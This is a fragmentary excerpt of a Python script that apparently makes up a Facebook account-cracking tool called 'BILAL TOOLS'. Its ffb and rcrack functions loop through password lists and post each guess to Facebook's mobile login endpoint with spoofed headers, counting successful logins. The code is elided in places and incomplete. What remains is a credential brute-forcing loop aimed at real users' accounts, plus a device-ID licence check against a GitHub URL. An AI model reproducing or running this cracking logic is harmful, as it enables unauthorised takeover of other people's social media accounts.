...
--------------------------------------------------
\033[1;37m[-] ASSALAM-O-ALIKUM:
\033[1;37m[-]DEAR FRIENDZ WELLCOME TO BILAL TOOLS
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [BILAL] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [BILAL] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
           ...
           'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Bilal78700/new/main').text
